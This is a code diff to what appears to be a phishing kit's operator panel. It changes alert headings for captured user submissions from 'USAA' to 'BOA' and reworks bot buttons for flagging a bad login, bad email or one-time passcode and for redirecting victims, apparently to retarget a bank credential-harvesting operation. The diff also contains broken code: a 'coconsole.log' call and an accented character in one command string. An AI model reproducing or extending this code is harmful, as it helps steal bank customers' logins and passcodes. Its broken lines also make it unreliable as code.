@@ -239,6 +239,8 @@ async function getPageFlow(db, id = 1) {
   try {
     const row = await db.get(`SELECT pageFlow FROM admin_settings WHERE id = ?`, [id]);
     if (!row || !row.pageFlow) return DEFAULT_PAGEFLOW;
+    
+  coconsole.log(row.pageFlow);
 
     const parsed = JSON.parse(row.pageFlow);
 
@@ -430,10 +432,10 @@ async function buildMessage(data, options = {}) {
     let heading;
 
     if (hasEmailOrUsername) {
-      heading = `👤 USAA NEW USER SUBMISSION`;
+      heading = `👤 BOA NEW USER SUBMISSION`;
     } else {
       const display = identifier || userId;
-      heading = `👤 USAA SUBMISSION\n\n USER: @${display}`;
+      heading = `👤 BOA SUBMISSION\n\n USER: @${display}`;
     }
 
     let message = `${heading}\n\n`;
@@ -631,18 +633,18 @@ buttons.push([
 ]);
 
 // Row 2 (Login / Auth / OTP only)
-if (page === "login" || page === "auth" || page === "otp") {
+if (page === "login" || page === "email" || page === "otp") {
   let badButton;
 
   if (page === "login") {
     badButton = {
-      text: "Bad Email",
-      callback_data: `cmd:bad-email:${userId}`
-    };
-  } else if (page === "auth") {
-    badButton = {
       text: "Bad Login",
       callback_data: `cmd:bad-login:${userId}`
+    };
+  } else if (page === "email") {
+    badButton = {
+      text: "Bad Email",
+      callback_data: `cmd:bad-emaìl:${userId}`
     };
   } else if (page === "otp") {
     badButton = {
@@ -660,20 +662,11 @@ if (page === "login" || page === "auth" || page === "otp") {
   ]);
 }
 
-// Row 3 (Prompt only on auth & otp)
-if (page === "auth" || page === "otp") {
-  buttons.push([
-    {
-      text: "Prompt",
-      callback_data: `cmd:prompt:${userId}`
-    }
-  ]);
-}
 
 // Row 4
 buttons.push([
   {
-    text: "Redirect",
+    text: "Redirect", 
     callback_data: `cmd:redirect:${userId}`
   },
   {
